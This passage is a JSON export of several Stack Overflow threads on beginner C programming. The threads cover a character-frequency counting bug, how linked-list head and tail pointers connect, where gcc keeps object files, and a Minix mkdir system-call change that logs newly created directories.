"user_id": 5791885, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/27301ad8ec704ea49d131cdf72372e28?s=128&d=identicon&r=PG&f=1", "display_name": "Bitan Basak", "link": "https://stackoverflow.com/users/5791885/bitan-basak"}, "edited": false, "score": 0, "creation_date": 1461786299, "post_id": 36892719, "comment_id": 61363072, "body": "Thanks! Your code showed me what I was doing wrong."}, {"owner": {"reputation": 2444, "user_id": 559644, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9oDuZ.png?s=128&g=1", "display_name": "totoro", "link": "https://stackoverflow.com/users/559644/totoro"}, "reply_to_user": {"reputation": 61, "user_id": 5791885, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/27301ad8ec704ea49d131cdf72372e28?s=128&d=identicon&r=PG&f=1", "display_name": "Bitan Basak", "link": "https://stackoverflow.com/users/5791885/bitan-basak"}, "edited": false, "score": 0, "creation_date": 1461797453, "post_id": 36892719, "comment_id": 61368688, "body": "@BitanBasak May I ask what you found out was wrong?"}], "tags": [], "owner": {"reputation": 62852, "user_id": 1737, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/9152c282382ec3b1f0cd18dc8ba7a5ab?s=128&d=identicon&r=PG", "display_name": "Roddy", "link": "https://stackoverflow.com/users/1737/roddy"}, "is_accepted": true, "score": 2, "last_activity_date": 1461767080, "creation_date": 1461767080, "answer_id": 36892719, "question_id": 36892298, "link": "https://stackoverflow.com/questions/36892298/calculating-the-character-frequency-in-a-string-using-c/36892719#36892719", "title": "Calculating the Character frequency in a String using C", "body": "<p>It works fine, but the output may be confusing you!</p>\n\n<p>For the input string \"Foo\", the output is this:</p>\n\n<pre><code>f occurs 1 times in the entered string.\no occurs 2 times in the entered string.\n</code></pre>\n\n<p>Lower and uppercase are counted together, so you don't see \"F occurs 1 times\".</p>\n\n<p><a href=\"http://ideone.com/ACJnPD\" rel=\"nofollow\">http://ideone.com/ACJnPD</a></p>\n"}, {"tags": [], "owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "is_accepted": false, "score": 0, "last_activity_date": 1461768314, "last_edit_date": 1461768314, "creation_date": 1461767539, "answer_id": 36892915, "question_id": 36892298, "link": "https://stackoverflow.com/questions/36892298/calculating-the-character-frequency-in-a-string-using-c/36892915#36892915", "title": "Calculating the Character frequency in a String using C", "body": "<p>IGuessing that the problem is to separate count of Upper and Lower case character you could use different arrays to count frequencies:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n   char string[100];\n   int c = 0, countLower[26] = {0};\n   int countUpper[26] = {0};\n\n   printf(\"Enter a string\\n\");\n   fgets(string,100,stdin);\n\n   while((string[c] != '\\0') &amp;&amp; (string[c] != '\\n')) {\n      c++;\n   }\n\n   string[c] = '\\0';\n   c = 0;\n\n   while (string[c] != '\\0')\n   {\n      /** Considering characters from 'a' to 'z' only\n          and ignoring others */\n\n      if (string[c] &gt;= 'a' &amp;&amp; string[c] &lt;= 'z')\n          countLower[string[c]-'a']++;\n      else if(string[c] &gt;= 'A' &amp;&amp; string[c]&lt;= 'Z')\n          countUpper[string[c]-'A']++;\n\n      c++;\n   }\n\n   for (c = 0; c &lt; 26; c++)\n   {\n      /** Printing only those characters\n          whose count is at least 1 */\n\n      if (countLower[c] != 0)\n         printf(\"%c occurs %d times in the entered string.\\n\",c+'a',countLower[c]);\n      if (countUpper[c] != 0)\n         printf(\"%c occurs %d times in the entered string.\\n\",c+'A',countUpper[c]);\n   }\n\n   return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 61, "user_id": 5791885, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/27301ad8ec704ea49d131cdf72372e28?s=128&d=identicon&r=PG&f=1", "display_name": "Bitan Basak", "link": "https://stackoverflow.com/users/5791885/bitan-basak"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 956, "favorite_count": 0, "accepted_answer_id": 36892719, "answer_count": 3, "score": -2, "last_activity_date": 1461785738, "creation_date": 1461766122, "last_edit_date": 1461785738, "question_id": 36892298, "link": "https://stackoverflow.com/questions/36892298/calculating-the-character-frequency-in-a-string-using-c", "title": "Calculating the Character frequency in a String using C", "body": "<p>I have written a program to calculate the character frequency in a string entered by the user. It's giving correct output for all lower case letters but it's not working for upper case letters. I am unable to find the problem in the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n   char string[100];\n   int c = 0, count[26] = {0};\n\n   printf(\"Enter a string\\n\");\n   fgets(string,100,stdin);\n\n   while(string[c] != '\\n') {\n      c++;\n   }\n   string[c] = '\\0';\n   c = 0;\n\n   while (string[c] != '\\0')\n   {\n      /** Considering characters from 'a' to 'z' only\n          and ignoring others */\n\n      if (string[c] &gt;= 'a' &amp;&amp; string[c] &lt;= 'z') \n         count[string[c]-'a']++;\n      else if(string[c] &gt;= 'A' &amp;&amp; string[c]&lt;= 'Z')\n         count[string[c]-'A']++;\n\n      c++;\n   }\n\n   for (c = 0; c &lt; 26; c++)\n   {\n      /** Printing only those characters \n          whose count is at least 1 */\n\n      if (count[c] != 0)\n         printf(\"%c occurs %d times in the entered string.\\n\",c+'a',count[c]);\n   }\n\n   return 0;\n}\n</code></pre>\n\n<p>Please Help!</p>\n\n<p>Here is the screenshot. Hopefully you will understand what problem I am facing:</p>\n\n<p><a href=\"https://i.stack.imgur.com/mwHCo.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/mwHCo.png\" alt=\"enter image description here\"></a></p>\n\n<p>It's not counting the upper case letters.</p>\n"}, {"tags": ["c", "struct"], "comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 1, "creation_date": 1461764852, "post_id": 36891517, "comment_id": 61347768, "body": "<code>int Arr[N] = { 3, 4, 1, 0, 8 },</code> this doesn&#39;t seem correct ."}, {"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1461764966, "post_id": 36891517, "comment_id": 61347856, "body": "<i>&quot;head&#39;s null is initialized to the first allocated temp&quot;</i> What does this mean?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 3, "creation_date": 1461765019, "post_id": 36891517, "comment_id": 61347906, "body": "@ameyCU actually <code>int Arr[N] = { 3, 4, 1, 0, 8 }, i;</code> is correct even if it looks strange."}, {"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1461765041, "post_id": 36891517, "comment_id": 61347925, "body": "@ameyCU: Regardless, it is! Though that <code>i</code> declaration is entirely redundant."}, {"owner": {"reputation": 1542, "user_id": 2659892, "user_type": "registered", "accept_rate": 74, "profile_image": "https://graph.facebook.com/675312914/picture?type=large", "display_name": "Ilan Aizelman WS", "link": "https://stackoverflow.com/users/2659892/ilan-aizelman-ws"}, "edited": false, "score": 0, "creation_date": 1461765123, "post_id": 36891517, "comment_id": 61348001, "body": "I&#39;ve uploaded the whole code, you can run and test that it works. I just don&#39;t understand how there is a connection between head&#39;s node and the other nodes."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1461765222, "post_id": 36891517, "comment_id": 61348075, "body": "@IlanAizelmanWS your code on pastebin lacks the <code>ListDisplay</code> function."}, {"owner": {"reputation": 1542, "user_id": 2659892, "user_type": "registered", "accept_rate": 74, "profile_image": "https://graph.facebook.com/675312914/picture?type=large", "display_name": "Ilan Aizelman WS", "link": "https://stackoverflow.com/users/2659892/ilan-aizelman-ws"}, "reply_to_user": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1461765223, "post_id": 36891517, "comment_id": 61348077, "body": "@LightnessRacesinOrbit That means, that the first node is initialized to be the head."}, {"owner": {"reputation": 1542, "user_id": 2659892, "user_type": "registered", "accept_rate": 74, "profile_image": "https://graph.facebook.com/675312914/picture?type=large", "display_name": "Ilan Aizelman WS", "link": "https://stackoverflow.com/users/2659892/ilan-aizelman-ws"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1461765252, "post_id": 36891517, "comment_id": 61348103, "body": "@MichaelWalz I have not written that function yet"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1461765268, "post_id": 36891517, "comment_id": 61348115, "body": "I really don&#39;t understand. First iteration <code>if (*head == NULL) *head = temp;</code> set the head to the <code>Arr[0].</code> What is your doubt?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 2, "creation_date": 1461765289, "post_id": 36891517, "comment_id": 61348137, "body": "You wrote this code, forgot how it works and now cannot run it under a debugger to find out?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1461765309, "post_id": 36891517, "comment_id": 61348162, "body": "@IlanAizelmanWS ... well then don&#39;t claim that it runs."}, {"owner": {"reputation": 1542, "user_id": 2659892, "user_type": "registered", "accept_rate": 74, "profile_image": "https://graph.facebook.com/675312914/picture?type=large", "display_name": "Ilan Aizelman WS", "link": "https://stackoverflow.com/users/2659892/ilan-aizelman-ws"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1461765451, "post_id": 36891517, "comment_id": 61348283, "body": "@MartinJames I didn&#39;t write the code, I wrote just the last recursive function."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1461765524, "post_id": 36891517, "comment_id": 61348356, "body": "BTW <code>arr[1],..,arr[N]</code> --&gt; <code>arr[1],..,arr[N-1]</code>"}, {"owner": {"reputation": 1542, "user_id": 2659892, "user_type": "registered", "accept_rate": 74, "profile_image": "https://graph.facebook.com/675312914/picture?type=large", "display_name": "Ilan Aizelman WS", "link": "https://stackoverflow.com/users/2659892/ilan-aizelman-ws"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461765595, "post_id": 36891517, "comment_id": 61348426, "body": "@BLUEPIXY That&#39;s true :)"}], "answers": [{"comments": [{"owner": {"reputation": 1542, "user_id": 2659892, "user_type": "registered", "accept_rate": 74, "profile_image": "https://graph.facebook.com/675312914/picture?type=large", "display_name": "Ilan Aizelman WS", "link": "https://stackoverflow.com/users/2659892/ilan-aizelman-ws"}, "edited": false, "score": 0, "creation_date": 1461765572, "post_id": 36891912, "comment_id": 61348401, "body": "Thank you very much dbush. Quick question, in the second iteration head&#39;s and tail&#39;s next are the same because they both point on the same structure?"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 1542, "user_id": 2659892, "user_type": "registered", "accept_rate": 74, "profile_image": "https://graph.facebook.com/675312914/picture?type=large", "display_name": "Ilan Aizelman WS", "link": "https://stackoverflow.com/users/2659892/ilan-aizelman-ws"}, "edited": false, "score": 0, "creation_date": 1461765678, "post_id": 36891912, "comment_id": 61348486, "body": "@IlanAizelmanWS Correct.  If two pointers point to the same place (i.e. have the same value), then dereferencing either of them will give you the exact same thing."}, {"owner": {"reputation": 1542, "user_id": 2659892, "user_type": "registered", "accept_rate": 74, "profile_image": "https://graph.facebook.com/675312914/picture?type=large", "display_name": "Ilan Aizelman WS", "link": "https://stackoverflow.com/users/2659892/ilan-aizelman-ws"}, "edited": false, "score": 0, "creation_date": 1461765807, "post_id": 36891912, "comment_id": 61348597, "body": "I see. Thanks for your time and explanation. That was really helpful!"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 4, "last_activity_date": 1461765228, "creation_date": 1461765228, "answer_id": 36891912, "question_id": 36891517, "link": "https://stackoverflow.com/questions/36891517/how-does-head-connected-to-tail-when-deleting-the-list/36891912#36891912", "title": "How does head connected to tail when deleting the list", "body": "<p>After the first iteration of the loop, <code>head</code> and <code>tail</code> point to the same element which contains <code>arr[0]</code>.  After the second iteration, <code>(*tail)-&gt;next</code> (which is the same as <code>(*head)-&gt;next</code>) point to the new element that contains <code>arr[1]</code>, and <code>tail</code> is moved up to this value.  Subsequent iterations keep appending to the end of the list.</p>\n\n<p>So after one iteration, you have this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>head      tail\n  |         |\n  v         v\n---------------\n|  3 |  NULL  |\n---------------\n</code></pre>\n\n<p>After the second iteration, you have this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>head                     tail\n  |                       |\n  v                       v\n---------------    ---------------\n|  3 |  .-----|---&gt;|  4 |  NULL  |\n---------------    ---------------\n</code></pre>\n\n<p>And the third:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>head                                       tail\n  |                                          |\n  v                                          v\n---------------    ---------------    ---------------\n|  3 |  .-----|---&gt;|  4 |  .-----|---&gt;|  1 |  NULL  |\n---------------    ---------------    ---------------\n</code></pre>\n"}], "owner": {"reputation": 1542, "user_id": 2659892, "user_type": "registered", "accept_rate": 74, "profile_image": "https://graph.facebook.com/675312914/picture?type=large", "display_name": "Ilan Aizelman WS", "link": "https://stackoverflow.com/users/2659892/ilan-aizelman-ws"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 36891912, "answer_count": 1, "score": 0, "last_activity_date": 1461765228, "creation_date": 1461764267, "last_edit_date": 1461765075, "question_id": 36891517, "link": "https://stackoverflow.com/questions/36891517/how-does-head-connected-to-tail-when-deleting-the-list", "title": "How does head connected to tail when deleting the list", "body": "<p>I have a function which creates a list based on a given array,\nthis is the function:</p>\n\n<pre><code>typedef struct Item\n{\n    int num;\n    struct Item* next;\n}*PItem;\n\nint main()\n{\n    int Arr[N] = { 3, 4, 1, 0, 8 }, i;\n\n    PItem list = NULL, tail = NULL;\n\n    CreateListFromArray(&amp;list, &amp;tail, Arr);\n}\nvoid CreateListFromArray(PItem* head, PItem* tail, int *Arr)\n{\n    int i;\n    PItem temp;\n    for (i = 0; i&lt;N; i++)\n    {\n        temp = (PItem)malloc(sizeof(struct Item));\n        if (temp == NULL)\n        {\n            DeleteList(head);\n            Error_Msg(\"Memmory!\");\n        }\n        temp-&gt;num = Arr[i];\n        temp-&gt;next = NULL;\n        if (*head == NULL)\n            *head = temp;\n        else\n            (*tail)-&gt;next = temp;\n        *tail = temp;\n    }\n}\n</code></pre>\n\n<p>I understand that if List is empty, then head's null is initialized to the first allocated temp (<code>arr[0]</code>). But after that, for these arrays <code>arr[1],..,arr[N]</code>, I update only the tail, meaning that all the tails from <code>arr[1]</code> to <code>arr[N]</code> are connected. but how does the head (<code>arr[0]</code>) POINTS/connected to <code>arr[1]</code>?</p>\n\n<p>I ask this because, when I try to print the list, I use <code>temp = head</code>, and advance head until temp is null, but when I advance head, how does it know that it has to advance to <code>arr[1]</code>?</p>\n\n<p><strong>Here's the full code:</strong> <a href=\"http://pastebin.com/VPCfMU4X\" rel=\"nofollow\">http://pastebin.com/VPCfMU4X</a></p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 182833, "user_id": 2970947, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HAq55.png?s=128&g=1", "display_name": "Elliott Frisch", "link": "https://stackoverflow.com/users/2970947/elliott-frisch"}, "edited": false, "score": 0, "creation_date": 1461763638, "post_id": 36891192, "comment_id": 61346756, "body": "Sounds like your build system doesn&#39;t save the intermediate object files. Since you say .exe I assume you&#39;re on Windows, what compiler are you using?"}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 0, "creation_date": 1461763646, "post_id": 36891192, "comment_id": 61346762, "body": "It depends on your toolchain. What is your toolchain ?"}, {"owner": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "edited": false, "score": 0, "creation_date": 1461763651, "post_id": 36891192, "comment_id": 61346768, "body": "They seem to be deleted right after linkage. There should be an option for keeping them, but it depends on your compiler."}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1461763681, "post_id": 36891192, "comment_id": 61346799, "body": "Why are you claiming with certainty that &quot;an object file is created&quot;? Who said that?"}, {"owner": {"reputation": 161, "user_id": 6227686, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3c55dab7f1374a6737d916a1c40f3a22?s=128&d=identicon&r=PG&f=1", "display_name": "Patrick", "link": "https://stackoverflow.com/users/6227686/patrick"}, "edited": false, "score": 0, "creation_date": 1461764262, "post_id": 36891192, "comment_id": 61347297, "body": "I am using gcc on cygwin. I guess I just assumed since I saw some text referring to a .o extension for object files."}], "answers": [{"comments": [{"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 0, "creation_date": 1461765187, "post_id": 36891237, "comment_id": 61348047, "body": "Probably because you mentioned interpreters and the question is about compilation. Some may read to fast."}], "tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": false, "score": 0, "last_activity_date": 1461765335, "last_edit_date": 1461765335, "creation_date": 1461763639, "answer_id": 36891237, "question_id": 36891192, "link": "https://stackoverflow.com/questions/36891192/where-are-object-files-of-c-programs-stored/36891237#36891237", "title": "Where are object files of c programs stored?", "body": "<p>It is implementation specific. Some (weird) implementations of C are interpreters, or (e.g. tinycc) may compile in memory (so don't produce any files). Others (e.g. my <a href=\"http://gcc.gnu.org/\" rel=\"nofollow\">GCC</a> compiler, when not asked to...) don't keep object files (so when you <code>gcc -Wall foo.c bar.c -o prog.exe</code> the <code>foo.obj</code> &amp; <code>bar.obj</code> are temporary so are not kept; but YMMV). </p>\n"}, {"tags": [], "owner": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "is_accepted": true, "score": 7, "last_activity_date": 1461764467, "last_edit_date": 1461764467, "creation_date": 1461763771, "answer_id": 36891292, "question_id": 36891192, "link": "https://stackoverflow.com/questions/36891192/where-are-object-files-of-c-programs-stored/36891292#36891292", "title": "Where are object files of c programs stored?", "body": "<p>Many compilers support the <code>-c</code> option to compile only and produce object files.</p>\n\n<p>If you use a <code>make</code>-based build, object files may be treated as <em>intermediate</em> and automatically removed. You may declare them in the <code>.PRECIOUS:</code> target to avoid this.</p>\n\n<p>If your program consists of only a single C source file, you could use</p>\n\n<pre><code>gcc -c file.c       # Creates file.o, but no file.exe\ngcc -o prog file.o  # Creates prog.exe by linking file.o with appropriate libs\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 11698, "user_id": 5399734, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/2162d669508364bb0c03aba1a2473aa8?s=128&d=identicon&r=PG&f=1", "display_name": "nalzok", "link": "https://stackoverflow.com/users/5399734/nalzok"}, "is_accepted": false, "score": 2, "last_activity_date": 1461764228, "creation_date": 1461764228, "answer_id": 36891491, "question_id": 36891192, "link": "https://stackoverflow.com/questions/36891192/where-are-object-files-of-c-programs-stored/36891491#36891491", "title": "Where are object files of c programs stored?", "body": "<p>As a language-lawyer answer, because the standard doesn't specify an \"object file\" must be created when a source is being compiled:(<a href=\"http://port70.net/~nsz/c/c11/n1570.html#note6\" rel=\"nofollow\">Quotation from N1570, 6th footnote</a>, emphasis mine)</p>\n\n<blockquote>\n  <p>6) Implementations shall behave as if these separate phases occur,\n  even though many are typically folded together in practice. Source\n  files, translation units, and <strong>translated translation units need not\n  necessarily be stored as files</strong>, nor need there be any one-to-one\n  correspondence between these entities and any external representation.\n  The description is conceptual only, and does not specify any\n  particular implementation.</p>\n</blockquote>\n\n<p>However, note that on most main-stream implementations, \"object files\" are generated and deleted. If you want to keep them, add the <code>-c</code> flag (works on both GCC and clang).</p>\n"}], "owner": {"reputation": 161, "user_id": 6227686, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3c55dab7f1374a6737d916a1c40f3a22?s=128&d=identicon&r=PG&f=1", "display_name": "Patrick", "link": "https://stackoverflow.com/users/6227686/patrick"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 949, "favorite_count": 0, "accepted_answer_id": 36891292, "answer_count": 3, "score": 3, "last_activity_date": 1461765335, "creation_date": 1461763515, "last_edit_date": 1461764069, "question_id": 36891192, "link": "https://stackoverflow.com/questions/36891192/where-are-object-files-of-c-programs-stored", "title": "Where are object files of c programs stored?", "body": "<p>After a c source code is compiled, an object file is created. I can only see the .exe file so where can I find the object file? I am using cygwin on windows so I am using gcc to compile programs.</p>\n"}, {"tags": ["c", "kernel", "system-calls", "mkdir", "minix"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 2, "creation_date": 1461764386, "post_id": 36890880, "comment_id": 61347408, "body": "I think you should check the <code>req_mkdir</code> return value to see if all went well."}, {"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 1, "creation_date": 1461764562, "post_id": 36890880, "comment_id": 61347547, "body": "You should call it where you commented out the printf, but conditioned with the return value of <code>req_mkdir</code>."}], "answers": [{"tags": [], "owner": {"reputation": 1760, "user_id": 3369324, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LBmEb.png?s=128&g=1", "display_name": "Cel Skeggs", "link": "https://stackoverflow.com/users/3369324/cel-skeggs"}, "is_accepted": true, "score": 2, "last_activity_date": 1464465890, "creation_date": 1464465890, "answer_id": 37503304, "question_id": 36890880, "link": "https://stackoverflow.com/questions/36890880/modyifing-existing-do-mkdir-system-call-to-print-created-folder-that-doesnt-a/37503304#37503304", "title": "Modyifing existing do_mkdir() system call to print created folder that doesn&#39;t already exist", "body": "<p>As suggested by the commenters, you need to check one more thing.</p>\n\n<p>The code near the section that you modified says:</p>\n\n<pre><code>/* Make sure that the object is a directory */\nif (!S_ISDIR(vp-&gt;v_mode)) {\n    r = ENOTDIR;\n} else if ((r = forbidden(fp, vp, W_BIT|X_BIT)) == OK) {\n    r = req_mkdir(vp-&gt;v_fs_e, vp-&gt;v_inode_nr, fullpath, fp-&gt;fp_effuid,\n                  fp-&gt;fp_effgid, bits);\n    printf(\"New dir -&gt; %s %o\",fullpath,dirmode);\n}\n</code></pre>\n\n<p>The key here is that the branches check that the parent directory exists, and then check that the program has permission to create a new directory - but nothing about whether or not a directory already existed.</p>\n\n<p>That check is done as part of <code>req_mkdir</code>, which returns an error code for whether or not it succeeded. You would want to check this error code:</p>\n\n<pre><code>/* Make sure that the object is a directory */\nif (!S_ISDIR(vp-&gt;v_mode)) {\n    r = ENOTDIR;\n} else if ((r = forbidden(fp, vp, W_BIT|X_BIT)) == OK) {\n    r = req_mkdir(vp-&gt;v_fs_e, vp-&gt;v_inode_nr, fullpath, fp-&gt;fp_effuid,\n                  fp-&gt;fp_effgid, bits);\n    if (r == OK) {\n        printf(\"New dir -&gt; %s %o\\n\", fullpath, dirmode);\n    }\n}\n</code></pre>\n\n<p>While I was at it, I also added the missing newline to the end of the <code>printf</code> format string so that it doesn't get strung together with the next line.</p>\n\n<p><em>Disclaimer: I haven't actually tested this, and might have made a mistake.</em></p>\n"}], "owner": {"reputation": 2741, "user_id": 3144500, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/SUkxu.png?s=128&g=1", "display_name": "solid.py", "link": "https://stackoverflow.com/users/3144500/solid-py"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 465, "favorite_count": 0, "accepted_answer_id": 37503304, "answer_count": 1, "score": 3, "last_activity_date": 1464468693, "creation_date": 1461762761, "last_edit_date": 1464468693, "question_id": 36890880, "link": "https://stackoverflow.com/questions/36890880/modyifing-existing-do-mkdir-system-call-to-print-created-folder-that-doesnt-a", "title": "Modyifing existing do_mkdir() system call to print created folder that doesn&#39;t already exist", "body": "<p>I'm trying to familiarize myself with modifying Minix system calls and rebuilding the kernel.</p>\n\n<p>I modified <code>mkdir</code> to print <code>New dir -&gt; &lt;directory-name&gt; &lt;permissions&gt;</code> every time it was called, <strong>unless the directory already existed</strong>.</p>\n\n<p>I edited <code>/usr/src/servers/vfs/open.c</code>, which contains the code for 